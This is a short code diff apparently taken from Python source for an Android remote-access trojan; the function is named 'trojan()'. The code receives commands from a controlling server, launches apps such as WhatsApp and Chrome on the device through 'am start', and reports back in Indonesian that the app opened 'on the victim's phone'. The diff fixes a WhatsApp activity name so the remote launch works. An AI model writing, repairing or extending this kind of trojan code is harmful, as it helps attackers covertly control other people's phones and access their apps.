@@ -30,7 +30,7 @@ def trojan():
  		elif 'run app -l' == server:
  			client.send(f'List Apps\n=====\nchrome\nwhatsapp\n\n Atau Kamu Bisa Menjalnkan Aplikasi Lain, Gunakan Aplikasi Current Activity untuk Melihat package name app dan Activity\n\n\nContoh run com.mobile.legends/com.moba.unityplugin.MobaGameUnityActivity'.encode("utf-8"))
  		elif 'run app whatsapp' == server or 'run app Whatsapp' == server:
- 			os.popen('am start --user 0 -n com.whatsapp/com.whatsapp.Home.Activity')
+ 			os.popen('am start --user 0 -n com.whatsapp/com.whatsapp.HomeActivity')
  			client.send(f'Succes Membuka whatsapp Di Hp Korban'.encode("utf-8"))
  		elif 'run app chrome' == server:
  			os.popen('am start --user 0 -n com.android.chrome/com.google.android.apps.chrome.Main')
